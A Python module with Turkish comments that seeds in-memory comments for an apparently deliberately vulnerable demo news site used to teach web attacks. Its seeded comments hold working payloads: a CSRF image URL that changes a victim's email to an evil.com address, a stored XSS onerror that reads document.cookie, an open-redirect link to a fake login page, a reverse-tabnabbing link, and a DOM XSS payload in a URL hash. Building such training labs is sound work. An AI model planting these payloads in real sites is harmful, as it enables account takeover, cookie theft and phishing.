"""Yorumlar (demo, bellekte tutulur -- posts.py gibi, DB yok).

Yapi:  COMMENTS[slug] = [ {yazar, metin, resim}, ... ]
  yazar : yorumu yazan kullanici
  metin : yorum metni
  resim : istege bagli bir gorsel URL'si (kullanici yorumuna resim ekleyebilir)
          -> CSRF demosunda saldirgan tam da burayi kotuye kullanacak.
"""

# Demo icin "onceden ekilmis" yorumlar. Son yorum SALDIRGANIN tuzagi:
# masum bir metin + resim URL'si olarak e-posta degistirme islemi.
# Bu habere giren giris-yapmis her kullanici (kurban) hacklenir.
COMMENTS = {
    # --- CSRF tuzagi (resim alaninda e-posta degistirme adresi) ---
    "parola-yoneticisi-sekiz-neden": [
        {"yazar": "mehmet58", "metin": "Gercekten faydali bir yazi, tesekkurler!", "resim": ""},
        {"yazar": "ays_e", "metin": "Ben de parola yoneticisine gectim, pismanlik yok.", "resim": ""},
        {"yazar": "deniz", "metin": "Harika anlatim, bir de su gorsele bakin 👇", "resim": "/hesap/email-degistir?email=saldirgan@evil.com"},
    ],
    # --- STORED XSS tuzagi (yorum METNINE gizlenmis kod) ---
    # Gorunur metin masum; sonundaki gizli <img> yuklenemeyince onerror calisir,
    # kurbanin cerezini okuyup farkindalik fonksiyonuna verir.
    "yapay-zeka-telefonlara-tasiniyor": [
        {"yazar": "teknosever", "metin": "Cihaz ustu modeller gercekten oyunu degistirecek.", "resim": ""},
        {"yazar": "x_kullanici", "metin": "Bence de cok yerinde tespitler 👏 <img src=x style=\"display:none\" onerror=\"window.xssYakala && window.xssYakala(document.cookie)\">", "resim": ""},
    ],
    # --- OPEN REDIRECT tuzagi: link METNI guvenilir gorunuyor, href ise /git ile
    #     sahte giris sayfasina gidiyor (metin != href = klasik phishing). ---
    "veri-sizintisi-ilk-24-saat": [
        {"yazar": "guvenlik_dostu", "metin": "Cok onemli bir konu. Resmi guvenlik rehberine buradan ulasabilirsiniz: <a href=\"/git?url=http://127.0.0.1:8000/sahte-giris\">teknopanorama.com/guvenlik-rehberi</a>", "resim": ""},
    ],
    # --- REVERSE TABNABBING tuzagi: target=_blank + rel=opener olan dis link.
    #     Yeni sekmede acilan sayfa window.opener ile eski sekmeyi ele gecirir. ---
    "acik-kaynak-bakimcilari": [
        {"yazar": "devtools_fan", "metin": "Bu araci denemelisiniz, baglantinizi gercekten iyi olcuyor: <a href=\"/tab-saldirgan\" target=\"_blank\" rel=\"opener\">speedtest-pro.com</a>", "resim": ""},
    ],
    # --- DOM-BASED XSS tuzagi: davet linki, payload URL'nin hash (#) kisminda.
    #     Hash sunucuya gitmez; /davet sayfasi onu client'ta innerHTML'e yazinca calisir. ---
    "cihaz-ustu-yapay-zeka-gizlilik": [
        {"yazar": "davetci", "metin": "Seni de Teknopanorama'ya davet ediyorum, buradan katilabilirsin: <a href=\"/davet#%3Cimg%20src%3Dx%20onerror%3DxssDom()%3E\">davet linkin hazir 🎉</a>", "resim": ""},
    ],
}


def yorumlar(slug: str):
    """Bir yazinin yorumlarini dondurur (yoksa bos liste)."""
    return COMMENTS.get(slug, [])


def yorum_ekle(slug: str, yazar: str, metin: str, resim: str = ""):
    """Yeni yorum ekler."""
    COMMENTS.setdefault(slug, []).append({
        "yazar": yazar,
        "metin": metin,
        "resim": resim,
    })
